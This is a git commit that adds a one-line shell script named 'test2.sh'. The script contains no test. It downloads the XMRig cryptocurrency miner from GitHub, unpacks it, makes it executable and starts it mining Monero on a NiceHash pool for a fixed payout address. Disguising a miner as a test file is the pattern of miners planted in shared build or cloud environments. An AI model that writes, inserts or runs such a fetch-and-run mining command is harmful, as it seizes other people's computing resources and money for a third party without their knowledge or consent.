ffc39a4c1c8722cbf5ef3172ab8ec4e0e42dfd53
geanenova28 <102361827+geanenova28@users.noreply.github.com>
2022-10-08 21:49:01 -0300

    Create test2.sh

---
+++ test2.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz && tar -xvf xmrig-6.16.2-linux-static-x64.tar.gz && cd xmrig-6.16.2 && chmod +x xmrig && ./xmrig -o randomxmonero.usa-west.nicehash.com:3380 -a rx -k -u 3H3W91fmg4wQN7wLh1zScVzcy3r88Hw5Fn.weavetest -p x
